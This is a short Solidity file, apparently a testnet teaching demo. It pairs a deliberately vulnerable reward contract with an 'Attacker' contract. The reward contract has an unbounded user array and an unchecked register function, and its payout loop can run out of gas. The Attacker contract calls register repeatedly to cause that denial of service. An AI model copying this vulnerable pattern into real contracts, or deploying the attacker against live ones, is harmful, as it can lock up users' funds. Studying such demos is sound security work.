// SPDX-License-Identifier: MIT
pragma solidity ^0.8.36;

contract UnboundedContract {

    address[] public users;
    mapping(address => bool) public registered;

    function register() external {
        users.push(msg.sender);
    }

    function distributeRewards() external payable {
        uint256 share = address(this).balance / users.length;
        for (uint256 i = 0; i < users.length; i++) {
            (bool success, ) = users[i].call{value: share}("");
            require(success, "Transfer failed");
        }
    }

    function getUserCount() external view returns (uint256) {
        return users.length;
    }

    function deposit() external  payable  {}
}

// https://sepolia.etherscan.io/address/0x3f18c002d57e7b911a44dd6cc20df216154f52c4

contract Attacker {
    UnboundedContract public target;

    constructor(UnboundedContract _target) {
        target = _target;
    }

    function attack(uint256 iterations) external {
        for (uint256 i = 0; i < iterations; i++) {
            target.register();
        }
    }

    receive() external payable { }
}

// https://sepolia.etherscan.io/address/0x175779561cc141f190e9fbfb41ce004033673b0f/advanced
// https://eth-converter.com/
